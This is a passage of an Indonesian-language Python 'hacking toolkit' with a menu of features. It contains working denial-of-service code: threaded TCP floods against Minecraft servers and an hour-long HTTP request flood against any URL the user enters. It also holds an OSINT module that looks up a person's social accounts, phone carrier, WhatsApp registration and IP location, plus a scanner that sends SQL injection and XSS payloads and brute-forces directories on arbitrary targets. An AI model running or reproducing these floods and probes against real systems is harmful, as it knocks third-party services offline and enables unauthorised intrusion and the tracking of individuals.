                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((server, port))
                    s.send(b"\x00" * 100)
                    sent += 1
                    s.close()
                except:
                    pass
        
        thread_list = []
        for i in range(threads):
            if i % 2 == 0:
                t = threading.Thread(target=mc_ping)
            else:
                t = threading.Thread(target=mc_connect)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
                print(colored(f"[✓] PACKET SENT: {sent}", 'green'), end='\r')
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
    
    elif choice == "10":
        # Web 1 Jam
        target = input(colored("Target URL: ", 'yellow')).strip()
        if not target.startswith('http'):
            target = 'http://' + target
        threads = int(input(colored("Threads [500]: ", 'yellow')).strip() or "500")
        
        print(colored(f"\n[✓] WEB ATTACK 1 JAM KE {target}!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        end_time = time.time() + 3600
        stop_attack = False
        sent = 0
        
        def attack():
            nonlocal stop_attack, sent
            while time.time() < end_time and not stop_attack:
                try:
                    requests.get(target, timeout=2)
                    sent += 1
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while time.time() < end_time and not stop_attack:
                remaining = int(end_time - time.time())
                print(colored(f"[✓] SISA {remaining//60}m {remaining%60}s | PACKET: {sent}", 'green'), end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED EARLY - TOTAL: {sent} PACKET", 'yellow'))
        else:
            print(colored(f"\n\n[✓] ATTACK SELESAI 1 JAM! TOTAL: {sent} PACKET", 'green'))
    
    elif choice == "11":
        # Minecraft 1 Jam
        server = input(colored("Server IP: ", 'yellow')).strip()
        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
        threads = int(input(colored("Threads [500]: ", 'yellow')).strip() or "500")
        
        print(colored(f"\n[✓] MC ATTACK 1 JAM KE {server}:{port}!", 'red'))
        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
        
        end_time = time.time() + 3600
        stop_attack = False
        sent = 0
        
        def attack():
            nonlocal stop_attack, sent
            while time.time() < end_time and not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((server, port))
                    s.send(b"\x00" * 100)
                    sent += 1
                    s.close()
                except:
                    pass
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while time.time() < end_time and not stop_attack:
                remaining = int(end_time - time.time())
                print(colored(f"[✓] SISA {remaining//60}m {remaining%60}s | PACKET: {sent}", 'green'), end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack = True
            print(colored(f"\n\n[✗] ATTACK STOPPED EARLY - TOTAL: {sent} PACKET", 'yellow'))
        else:
            print(colored(f"\n\n[✓] ATTACK SELESAI 1 JAM! TOTAL: {sent} PACKET", 'green'))
    
    else:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
    
    save_result("ddos.log", f"Type: {choice} | Target: {target if 'target' in locals() else server if 'server' in locals() else 'N/A'}")
    input("\nPress Enter to continue...")

# ================== FITUR 21: OSINT & TRACKING ==================
def fitur_21():
    os.system('clear')
    print(colored("\n[21] OSINT & TRACKING", 'cyan', attrs=['bold']))
    print(colored("   [INFORMATION GATHERING]", 'yellow'))
    
    target = input(colored("Target (username/email/phone): ", 'yellow')).strip()
    
    print(colored("\nPilih tipe OSINT:", 'cyan'))
    osint_types = {
        "1": ("Username Search (Social Media)", "username"),
        "2": ("Email Lookup", "email"),
        "3": ("Phone Number Info", "phone"),
        "4": ("IP Address Geolocation", "ip"),
        "5": ("Domain Reconnaissance", "domain")
    }
    
    for key, (name, otype) in osint_types.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih tipe [1-5]: ", 'yellow')).strip()
    
    if choice not in osint_types:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    if choice == "1":  # Username search
        print(colored(f"\n[MENCARI USERNAME {target} DI SOSIAL MEDIA]", 'cyan'))
        sites = {
            "Facebook": f"https://facebook.com/{target}",
            "Instagram": f"https://instagram.com/{target}",
            "Twitter": f"https://twitter.com/{target}",
            "TikTok": f"https://tiktok.com/@{target}",
            "GitHub": f"https://github.com/{target}"
        }
        
        found = []
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    # Cek apakah benar-benar halaman user (bukan not found)
                    if "not found" not in r.text.lower() and "404" not in r.text.lower() and "halaman tidak ditemukan" not in r.text.lower():
                        print(colored(f"[✓] Ditemukan di {site}: {url}", 'green'))
                        found.append(site)
                    else:
                        print(colored(f"[✗] Tidak ditemukan di {site}", 'red'))
                else:
                    print(colored(f"[✗] Tidak ditemukan di {site}", 'red'))
            except Exception as e:
                print(colored(f"[✗] Gagal cek {site}: {str(e)[:30]}", 'red'))
        
        save_result("osint.log", f"Username: {target} | Found: {', '.join(found) if found else 'None'}")
    
    elif choice == "2":  # Email lookup
        print(colored(f"\n[MENCARI INFORMASI EMAIL {target}]", 'cyan'))
        
        # Cek format email
        if '@' not in target or '.' not in target:
            print(colored("[✗] Format email tidak valid", 'red'))
        else:
            # Cek breach via HaveIBeenPwned API
            try:
                email_hash = hashlib.sha1(target.lower().encode()).hexdigest().upper()
                prefix = email_hash[:5]
                suffix = email_hash[5:]
                
                r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
                if r.status_code == 200:
                    if suffix in r.text:
                        print(colored("[!] EMAIL DITEMUKAN DI DATA BREACH!", 'red'))
                        print(colored("    Password mungkin telah bocor", 'yellow'))
                    else:
                        print(colored("[✓] Email tidak ditemukan di database breach", 'green'))
                else:
                    print(colored("[✗] Gagal cek breach database", 'red'))
            except Exception as e:
                print(colored(f"[✗] Gagal cek breach: {str(e)[:30]}", 'red'))
            
            # Cek domain email
            domain = target.split('@')[1]
            try:
                mx_records = socket.gethostbyname(domain)
                print(colored(f"[✓] Domain {domain} valid (IP: {mx_records})", 'green'))
            except:
                print(colored(f"[✗] Domain {domain} tidak valid", 'red'))
    
    elif choice == "3":  # Phone number
        print(colored(f"\n[INFORMASI NOMOR {target}]", 'cyan'))
        
        # Validasi nomor Indonesia
        if target.startswith("62") and len(target) >= 10 and len(target) <= 13:
            # Deteksi provider berdasarkan prefix
            prefix = target[:5]
            provider = "Unknown"
            
            # Telkomsel
            if any(prefix.startswith(p) for p in ["62811", "62812", "62813", "62821", "62822", "62823"]):
                provider = "Telkomsel"
            # Indosat
            elif any(prefix.startswith(p) for p in ["62814", "62815", "62855", "62856", "62857"]):
                provider = "Indosat Ooredoo"
            # XL
            elif any(prefix.startswith(p) for p in ["62817", "62818", "62819", "62877", "62878", "62879"]):
                provider = "XL Axiata"
            # Tri
            elif any(prefix.startswith(p) for p in ["62895", "62896", "62897", "62898"]):
                provider = "Tri Indonesia"
            # Smartfren
            elif any(prefix.startswith(p) for p in ["62881", "62882", "62883", "62884", "62885", "62886", "62887", "62888", "62889"]):
                provider = "Smartfren"
            
            print(colored(f"[✓] Nomor: {target}", 'green'))
            print(colored(f"[✓] Format internasional: +{target}", 'green'))
            print(colored(f"[✓] Provider: {provider}", 'green'))
            print(colored(f"[✓] Jumlah digit: {len(target)}", 'green'))
            
            # Cek ketersediaan di WhatsApp
            print(colored("\n[✓] Mengecek WhatsApp...", 'cyan'))
            try:
                wa_check = requests.get(f"https://wa.me/{target}", timeout=5)
                if wa_check.status_code == 200:
                    if "this phone number is not registered" not in wa_check.text.lower():
                        print(colored(f"[✓] Nomor terdaftar di WhatsApp", 'green'))
                    else:
                        print(colored(f"[✗] Nomor tidak terdaftar di WhatsApp", 'yellow'))
                else:
                    print(colored(f"[?] Tidak bisa memverifikasi WhatsApp", 'yellow'))
            except:
                print(colored(f"[?] Tidak bisa memverifikasi WhatsApp", 'yellow'))
        else:
            print(colored("[✗] Nomor tidak valid (harus 62xx dan 10-13 digit)", 'red'))
    
    elif choice == "4":  # IP geolocation
        print(colored(f"\n[GEOLOKASI IP {target}]", 'cyan'))
        
        # Validasi format IP
        import ipaddress
        try:
            ipaddress.ip_address(target)
            
            # Gunakan ip-api.com (free, no API key)
            try:
                r = requests.get(f"http://ip-api.com/json/{target}", timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if data.get('status') == 'success':
                        print(colored(f"IP: {data.get('query')}", 'white'))
                        print(colored(f"Negara: {data.get('country')} ({data.get('countryCode')})", 'white'))
                        print(colored(f"Region: {data.get('regionName')}", 'white'))
                        print(colored(f"Kota: {data.get('city')}", 'white'))
                        print(colored(f"Kode Pos: {data.get('zip', 'N/A')}", 'white'))
                        print(colored(f"ISP: {data.get('isp')}", 'white'))
                        print(colored(f"Organisasi: {data.get('org', 'N/A')}", 'white'))
                        print(colored(f"AS: {data.get('as', 'N/A')}", 'white'))
                        print(colored(f"Lat/Lon: {data.get('lat')}, {data.get('lon')}", 'white'))
                        print(colored(f"Timezone: {data.get('timezone')}", 'white'))
                    else:
                        print(colored(f"[✗] Gagal mendapatkan lokasi: {data.get('message', 'Unknown error')}", 'red'))
                else:
                    print(colored("[✗] Gagal koneksi ke API geolokasi", 'red'))
            except Exception as e:
                print(colored(f"[✗] Error: {str(e)[:30]}", 'red'))
                
        except ValueError:
            print(colored("[✗] Format IP tidak valid", 'red'))
    
    else:  # Domain recon
        print(colored(f"\n[RECONNAISSANCE DOMAIN {target}]", 'cyan'))
        
        # Cek format domain
        if '.' not in target:
            print(colored("[✗] Format domain tidak valid", 'red'))
        else:
            # DNS lookup
            try:
                ip = socket.gethostbyname(target)
                print(colored(f"[✓] IP Address: {ip}", 'green'))
                
                # WHOIS lookup
                if WHOIS_AVAILABLE:
                    try:
                        w = whois.whois(target)
                        print(colored(f"\n[✓] Registrar: {w.registrar}", 'green'))
                        print(colored(f"[✓] Creation Date: {w.creation_date}", 'green'))
                        print(colored(f"[✓] Expiration Date: {w.expiration_date}", 'green'))
                    except:
                        pass
                
                # Cek subdomain umum
                print(colored("\n[✓] Mencari subdomain umum...", 'cyan'))
                subdomains = ["www", "mail", "admin", "blog", "api", "ftp", "cpanel", "webmail", "ns1", "ns2"]
                found_sub = []
                
                for sub in subdomains:
                    try:
                        sub_ip = socket.gethostbyname(f"{sub}.{target}")
                        print(colored(f"[✓] {sub}.{target} -> {sub_ip}", 'green'))
                        found_sub.append(sub)
                    except:
                        pass
                
                if not found_sub:
                    print(colored("[✗] Tidak ada subdomain umum yang ditemukan", 'yellow'))
                
            except socket.gaierror:
                print(colored("[✗] Domain tidak dapat di-resolve", 'red'))
            except Exception as e:
                print(colored(f"[✗] Error: {str(e)[:30]}", 'red'))
    
    save_result("osint.log", f"Target: {target} | Type: {osint_types[choice][0]}")
    input("\nPress Enter to continue...")

# ================== FITUR 5: IMAGE TOOLS ==================
def fitur_5():
    os.system('clear')
    print(colored("\n[5] IMAGE TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [MANIPULASI GAMBAR]", 'yellow'))
    
    if not PILLOW_AVAILABLE:
        print(colored("\n[ERROR] Pillow tidak terinstall!", 'red'))
        print(colored("   Install: pip install pillow", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih operasi:", 'cyan'))
    print("1. Convert Format Gambar")
    print("2. Resize Gambar")
    print("3. Apply Filter")
    print("4. Tambah Text/Watermark")
    print("5. Steganography (Sembunyikan Data)")
    
    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
    
    if choice not in ["1","2","3","4","5"]:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    file_path = input(colored("Path gambar: ", 'yellow')).strip()
    
    if not os.path.exists(file_path):
        print(colored("[ERROR] File tidak ditemukan!", 'red'))
        input("\nEnter...")
        return
    
    try:
        img = Image.open(file_path)
        print(colored(f"[✓] Gambar berhasil dibuka: {img.size[0]}x{img.size[1]}", 'green'))
        
        if choice == "1":  # Convert
            print("\nFormat tersedia: jpg, png, bmp, gif, webp")
            output_format = input("Format output: ").strip().lower()
            if output_format not in ['jpg', 'jpeg', 'png', 'bmp', 'gif', 'webp']:
                print(colored("[ERROR] Format tidak didukung", 'red'))
            else:
                if output_format == 'jpg':
                    output_format = 'jpeg'
                output = f"converted_{int(time.time())}.{output_format}"
                
                # Convert mode jika perlu
                if output_format in ['jpeg'] and img.mode in ['RGBA', 'P']:
                    img = img.convert('RGB')
                
                img.save(output)
                print(colored(f"[✓] Tersimpan: {output}", 'green'))
        
        elif choice == "2":  # Resize
            try:
                width = int(input("Width: ") or str(img.size[0]))
                height = int(input("Height: ") or str(img.size[1]))
                
                if width <= 0 or height <= 0:
                    print(colored("[ERROR] Dimensi harus positif", 'red'))
                else:
                    img_resized = img.resize((width, height), Image.Resampling.LANCZOS)
                    output = f"resized_{int(time.time())}.jpg"
                    if img.mode in ['RGBA', 'P']:
                        img_resized = img_resized.convert('RGB')
                    img_resized.save(output)
                    print(colored(f"[✓] Resize ke {width}x{height}: {output}", 'green'))
            except ValueError:
                print(colored("[ERROR] Dimensi harus angka", 'red'))
        
        elif choice == "3":  # Filter
            print("\nFilter tersedia:")
            print("1. BLUR - Membuat gambar blur")
            print("2. CONTOUR - Efek garis tepi")
            print("3. DETAIL - Mempertajam detail")
            print("4. EDGE_ENHANCE - Meningkatkan tepi")
            print("5. EMBOSS - Efek timbul")
            print("6. SHARPEN - Menajamkan gambar")
            print("7. SMOOTH - Menghaluskan")
            
            filter_choice = input("Pilih filter [1-7]: ").strip()
            
            filters = {
                "1": ImageFilter.BLUR,
                "2": ImageFilter.CONTOUR,
                "3": ImageFilter.DETAIL,
                "4": ImageFilter.EDGE_ENHANCE,
                "5": ImageFilter.EMBOSS,
                "6": ImageFilter.SHARPEN,
                "7": ImageFilter.SMOOTH
            }
            
            if filter_choice in filters:
                img_filtered = img.filter(filters[filter_choice])
                output = f"filtered_{int(time.time())}.jpg"
                if img_filtered.mode in ['RGBA', 'P']:
                    img_filtered = img_filtered.convert('RGB')
                img_filtered.save(output)
                print(colored(f"[✓] Filter applied: {output}", 'green'))
            else:
                print(colored("[ERROR] Pilihan filter tidak valid", 'red'))
        
        elif choice == "4":  # Text
            text = input("Text to add: ")
            if not text:
                print(colored("[ERROR] Text tidak boleh kosong", 'red'))
            else:
                try:
                    x = int(input("Posisi X [10]: ") or "10")
                    y = int(input("Posisi Y [10]: ") or "10")
                    
                    draw = ImageDraw.Draw(img)
                    draw.text((x, y), text, fill=(255, 0, 0))
                    
                    output = f"watermarked_{int(time.time())}.jpg"
                    if img.mode in ['RGBA', 'P']:
                        img = img.convert('RGB')
                    img.save(output)
                    print(colored(f"[✓] Text added: {output}", 'green'))
                except ValueError:
                    print(colored("[ERROR] Posisi harus angka", 'red'))
        
        else:  # Steganography
            data = input("Data to hide: ")
            if not data:
                print(colored("[ERROR] Data tidak boleh kosong", 'red'))
            else:
                print(colored("[✓] Menyembunyikan data dalam gambar...", 'cyan'))
                
                # Simple LSB implementation
                # Convert data to binary
                binary_data = ''.join(format(ord(c), '08b') for c in data)
                binary_data += '1111111111111110'  # EOF marker
                
                # Get image data
                pixels = list(img.getdata())
                width, height = img.size
                
                if len(binary_data) > len(pixels) * 3:
                    print(colored("[ERROR] Data terlalu besar untuk gambar ini", 'red'))
                else:
                    new_pixels = []
                    data_idx = 0
                    
                    for pixel in pixels:
                        if data_idx < len(binary_data):
                            if isinstance(pixel, int):  # Grayscale
                                new_val = (pixel & 0xFE) | int(binary_data[data_idx])
                                new_pixels.append(new_val)
                                data_idx += 1
                            else:  # RGB/RGBA
                                r = (pixel[0] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[0]
                                data_idx += 1
                                g = (pixel[1] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[1]
                                data_idx += 1
                                b = (pixel[2] & 0xFE) | int(binary_data[data_idx]) if data_idx < len(binary_data) else pixel[2]
                                data_idx += 1
                                
                                if len(pixel) == 4:  # RGBA
                                    new_pixels.append((r, g, b, pixel[3]))
                                else:  # RGB
                                    new_pixels.append((r, g, b))
                        else:
                            new_pixels.append(pixel)
                    
                    # Create new image
                    img_stego = Image.new(img.mode, (width, height))
                    img_stego.putdata(new_pixels)
                    
                    output = f"stego_{int(time.time())}.png"
                    img_stego.save(output)
                    print(colored(f"[✓] Data hidden: {output}", 'green'))
                    print(colored(f"[✓] Panjang data: {len(data)} karakter", 'green'))
    
    except Exception as e:
        print(colored(f"[ERROR] {str(e)}", 'red'))
    
    input("\nPress Enter to continue...")

# ================== FITUR 22: ENCRYPT & DECRYPT ==================
def fitur_22():
    os.system('clear')
    print(colored("\n[22] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
    print(colored("   [KRIPTOGRAFI]", 'yellow'))
    
    if not CRYPTO_AVAILABLE:
        print(colored("\n[ERROR] Cryptography tidak terinstall!", 'red'))
        print(colored("   Install: pip install cryptography", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih operasi:", 'cyan'))
    print("1. Encrypt File/Text")
    print("2. Decrypt File/Text")
    print("3. Generate Key")
    print("4. Hash Generator (MD5/SHA)")
    print("5. Base64 Encode/Decode")
    
    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        data = input("Text/File path: ").strip()
        if not data:
            print(colored("[ERROR] Input tidak boleh kosong", 'red'))
        else:
            key = Fernet.generate_key()
            cipher = Fernet(key)
            
            if os.path.exists(data):
                with open(data, 'rb') as f:
                    file_data = f.read()
                encrypted = cipher.encrypt(file_data)
                enc_file = f"encrypted_{os.path.basename(data)}"
                with open(enc_file, 'wb') as f:
                    f.write(encrypted)
                print(colored(f"[✓] File terenkripsi: {enc_file}", 'green'))
            else:
                encrypted = cipher.encrypt(data.encode())
                enc_file = f"encrypted_{int(time.time())}.txt"
                with open(enc_file, 'w') as f:
                    f.write(encrypted.decode())
                print(colored(f"[✓] Text terenkripsi: {enc_file}", 'green'))
            
            key_file = f"key_{int(time.time())}.key"
            with open(key_file, 'wb') as f:
                f.write(key)
            print(colored(f"[✓] Key disimpan: {key_file}", 'green'))
            print(colored(f"Key: {key.decode()}", 'yellow'))
    
    elif choice == "2":
        enc_file = input("Encrypted file: ").strip()
        key_file = input("Key file: ").strip()
        
        if not os.path.exists(enc_file):
            print(colored("[ERROR] File encrypted tidak ditemukan", 'red'))
        elif not os.path.exists(key_file):
            print(colored("[ERROR] File key tidak ditemukan", 'red'))
        else:
            try:
                with open(key_file, 'rb') as f:
                    key = f.read()
                cipher = Fernet(key)
                
                with open(enc_file, 'rb') as f:
                    encrypted = f.read()
                decrypted = cipher.decrypt(encrypted)
                
                dec_file = f"decrypted_{os.path.basename(enc_file)}"
                with open(dec_file, 'wb') as f:
                    f.write(decrypted)
                print(colored(f"[✓] File didekripsi: {dec_file}", 'green'))
            except Exception as e:
                print(colored(f"[ERROR] Gagal dekripsi: {str(e)}", 'red'))
    
    elif choice == "3":
        key = Fernet.generate_key()
        key_file = f"generated_key_{int(time.time())}.key"
        with open(key_file, 'wb') as f:
            f.write(key)
        print(colored(f"[✓] Key: {key_file}", 'green'))
        print(colored(f"Key: {key.decode()}", 'yellow'))
    
    elif choice == "4":
        text = input("Text to hash: ").strip()
        if not text:
            print(colored("[ERROR] Text tidak boleh kosong", 'red'))
        else:
            print("\nPilih algoritma:")
            print("1. MD5")
            print("2. SHA1")
            print("3. SHA256")
            print("4. SHA512")
            
            algo = input("Pilih [1-4]: ").strip()
            
            if algo == "1":
                result = hashlib.md5(text.encode()).hexdigest()
                print(colored(f"\n[MD5] {result}", 'green'))
            elif algo == "2":
                result = hashlib.sha1(text.encode()).hexdigest()
                print(colored(f"\n[SHA1] {result}", 'green'))
            elif algo == "3":
                result = hashlib.sha256(text.encode()).hexdigest()
                print(colored(f"\n[SHA256] {result}", 'green'))
            elif algo == "4":
                result = hashlib.sha512(text.encode()).hexdigest()
                print(colored(f"\n[SHA512] {result}", 'green'))
            else:
                print(colored("[ERROR] Pilihan tidak valid", 'red'))
    
    elif choice == "5":
        text = input("Text: ").strip()
        if not text:
            print(colored("[ERROR] Text tidak boleh kosong", 'red'))
        else:
            op = input("Encode or Decode? (e/d): ").strip().lower()
            
            if op == 'e':
                result = base64.b64encode(text.encode()).decode()
                print(colored(f"\n[ENCODED] {result}", 'green'))
            elif op == 'd':
                try:
                    result = base64.b64decode(text).decode()
                    print(colored(f"\n[DECODED] {result}", 'green'))
                except Exception as e:
                    print(colored(f"[ERROR] Invalid Base64: {str(e)}", 'red'))
            else:
                print(colored("[ERROR] Pilihan tidak valid", 'red'))
    
    save_result("crypto.log", f"Operation: {choice}")
    input("\nPress Enter to continue...")

# ================== FITUR 7: EXPLOIT & SCANNER ==================
def fitur_7():
    os.system('clear')
    print(colored("\n[7] EXPLOIT & SCANNER", 'cyan', attrs=['bold']))
    print(colored("   [VULNERABILITY SCANNER]", 'yellow'))
    
    target = input(colored("Target URL/IP: ", 'yellow')).strip()
    
    if not target:
        print(colored("[ERROR] Target tidak boleh kosong", 'red'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih tipe scan:", 'cyan'))
    print("1. Port Scanner")
    print("2. SQL Injection Scanner")
    print("3. XSS Scanner")
    print("4. Directory Brute Force")
    print("5. CMS Detector")
    
    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
    
    if choice == "1":  # Port scanner
        print(colored(f"\n[SCAN PORT] {target}", 'cyan'))
        print(colored("Scanning port umum...", 'yellow'))
        
        # Common ports
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    # Get service name
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    print(colored(f"[✓] Port {port} OPEN - {service}", 'green'))
                    open_ports.append((port, service))
                sock.close()
            except:
                pass
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(port,))
            t.start()
            threads.append(t)
            time.sleep(0.05)  # Prevent overwhelming
        
        for t in threads:
            t.join()
        
        if not open_ports:
            print(colored("[✗] Tidak ada port terbuka yang ditemukan", 'yellow'))
        else:
            print(colored(f"\n[✓] Ditemukan {len(open_ports)} port terbuka", 'green'))
    
    elif choice == "2":  # SQLi scanner
        print(colored(f"\n[SCAN SQLi] {target}", 'cyan'))
        
        # Test parameters
        test_params = ['id', 'page', 'cat', 'product', 'user', 'username']
        
        # SQL injection payloads
        payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--"
        ]
        
        print(colored("Menguji parameter umum...", 'yellow'))
        
        for param in test_params:
            test_url = f"{target}?{param}=test"
            try:
                r = requests.get(test_url, timeout=3)
                original_length = len(r.text)
                
                for payload in payloads:
                    test_url = f"{target}?{param}={payload}"
                    try:
                        r = requests.get(test_url, timeout=3)
                        current_length = len(r.text)
                        
                        # Check for SQL errors
                        if any(err in r.text.lower() for err in ['mysql', 'sql', 'syntax', 'odbc', 'driver']):
                            print(colored(f"[!] Potensi SQLi di parameter {param} dengan payload: {payload}", 'red'))
                            print(colored(f"    Error SQL terdeteksi", 'yellow'))
                            break
                        
                        # Check for length difference
                        if abs(current_length - original_length) > 100:
                            print(colored(f"[?] Anomali di parameter {param} dengan payload: {payload}", 'yellow'))
                            print(colored(f"    Perbedaan panjang: {abs(current_length - original_length)}", 'yellow'))
                            
                    except:
                        pass
            except:
                pass
    
    elif choice == "3":  # XSS scanner
        print(colored(f"\n[SCAN XSS] {target}", 'cyan'))
        
        test_params = ['q', 's', 'search', 'query', 'keyword']
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>"
        ]
        
        for param in test_params:
            for payload in payloads:
                test_url = f"{target}?{param}={payload}"
                try:
                    r = requests.get(test_url, timeout=3)
                    if payload in r.text:
                        print(colored(f"[!] XSS DITEMUKAN di parameter {param}", 'red'))
                        print(colored(f"    Payload: {payload}", 'yellow'))
                        break
                except:
                    pass
    
    elif choice == "4":  # Directory brute force
        print(colored(f"\n[DIRECTORY BRUTE FORCE] {target}", 'cyan'))
        
        common_dirs = [
            'admin', 'login', 'wp-admin', 'administrator', 'backup', 'config',
            'sql', 'phpmyadmin', 'mysql', 'db', 'database', 'files', 'uploads',
            'images', 'css', 'js', 'vendor', 'api', 'v1', 'v2', 'rest', 'graphql'
        ]
        
        found = []
        
        for directory in common_dirs:
            try:
                url = f"{target.rstrip('/')}/{directory}"
                r = requests.get(url, timeout=2)
                if r.status_code == 200:
                    print(colored(f"[✓] FOUND: {url}", 'green'))
                    found.append(url)
                elif r.status_code == 403:
                    print(colored(f"[!] FORBIDDEN: {url}", 'yellow'))
                    found.append(f"{url} (403)")
                elif r.status_code == 301 or r.status_code == 302:
                    print(colored(f"[→] REDIRECT: {url} -> {r.headers.get('Location', '?')}", 'cyan'))
                    found.append(f"{url} (redirect)")
            except:
                pass
        
        if not found:
            print(colored("[✗] Tidak ada direktori yang ditemukan", 'yellow'))
    
    elif choice == "5":  # CMS detector
        print(colored(f"\n[CMS DETECTOR] {target}", 'cyan'))
        
        cms_signatures = {
            "WordPress": [
                "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
                "WordPress", "wp-admin"
            ],
            "Joomla": [
                "joomla", "com_content", "com_users", "Joomla!",
                "/media/jui/", "/media/system/"
            ],
            "Drupal": [
                "sites/all", "drupal.js", "Drupal.settings", "drupal.org",
                "core/misc/drupal.js"
            ],
            "Magento": [
                "skin/frontend", "Mage.Cookies", "Magento", "js/mage",
                "checkout/cart"
            ],
            "Laravel": [
                "laravel", "Laravel", "_token", "csrf"
            ],
            "CodeIgniter": [
                "ci_session", "CodeIgniter"
            ]
        }
        
        try:
            r = requests.get(target, timeout=5)
            content = r.text.lower()
            headers = r.headers
            
            detected = []
            
            # Check content
            for cms, signatures in cms_signatures.items():
                for sig in signatures:
                    if sig.lower() in content:
                        print(colored(f"[✓] Detected {cms} (signature: {sig})", 'green'))
                        detected.append(cms)
                        break
            
            # Check headers
            server = headers.get('Server', '')
            if 'nginx' in server.lower():
                print(colored(f"[✓] Web Server: Nginx", 'cyan'))
            elif 'apache' in server.lower():
                print(colored(f"[✓] Web Server: Apache", 'cyan'))
            elif 'iis' in server.lower():
                print(colored(f"[✓] Web Server: IIS", 'cyan'))
            
            if not detected:
                print(colored("[✗] CMS tidak terdeteksi", 'yellow'))
                
        except Exception as e:
            print(colored(f"[✗] Gagal mengakses target: {str(e)[:30]}", 'red'))
    
    save_result("exploit.log", f"Target: {target} | Scan: {choice}")
    input("\nPress Enter to continue...")

# ================== FITUR 23: WHATSAPP INVITE ==================
def fitur_23():
    os.system('clear')
    print(colored("\n[23] WHATSAPP INVITE", 'cyan', attrs=['bold']))
    print(colored("   [GENERATE LINK WA]", 'yellow'))
    
    phone = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
    
    # Validasi nomor
    if not phone.startswith('62') or len(phone) < 10:
        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih metode:", 'cyan'))
    print("1. Direct Chat Link")
    print("2. Group Invite Link (generate random)")
    print("3. WhatsApp Business Link")
    print("4. Broadcast Link")
    
    choice = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
    
    if choice == "1":
        link = f"https://wa.me/{phone}"
        message = input("Pesan (opsional): ").strip()
        if message:
            link += f"?text={urllib.parse.quote(message)}"
        print(colored(f"\n[LINK] {link}", 'green'))
        
    elif choice == "2":
        group_code = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        link = f"https://chat.whatsapp.com/{group_code}"
        print(colored(f"\n[GROUP LINK] {link}", 'green'))
        print(colored("[!] Ini adalah link random, bukan group real", 'yellow'))
        
    elif choice == "3":
        link = f"https://wa.me/{phone}?business=true"
        print(colored(f"\n[BUSINESS LINK] {link}", 'green'))
        
    elif choice == "4":
        link = f"https://web.whatsapp.com/send/?phone={phone}"
        print(colored(f"\n[BROADCAST LINK] {link}", 'green'))
        
    else:
        print(colored("[ERROR] Invalid!", 'red'))
        input("\nEnter...")
        return
    
    # QR Code option
    qr_choice = input("\nBuat QR Code? (y/n): ").lower()
    if qr_choice == 'y':
        try:
            import qrcode
            qr = qrcode.make(link)
            qr_file = f"wa_qr_{int(time.time())}.png"
            qr.save(qr_file)
            print(colored(f"[✓] QR: {qr_file}", 'green'))
        except ImportError:
            print(colored("[!] Install qrcode: pip install qrcode[pil]", 'yellow'))
    
    save_result("whatsapp.log", f"Target: {phone} | Link: {link}")
    input("\nPress Enter to continue...")

# ================== FITUR 9: DASHBOARD ==================
def fitur_9():
    os.system('clear')
    print(colored("\n[9] DASHBOARD", 'cyan', attrs=['bold']))
    print(colored("   [STATISTIK SISTEM]", 'yellow'))
    
    print(colored("\n[SISTEM]", 'magenta'))
    print(colored(f"   OS: {os.name}", 'white'))
    print(colored(f"   CPU: {os.cpu_count()} core", 'white'))
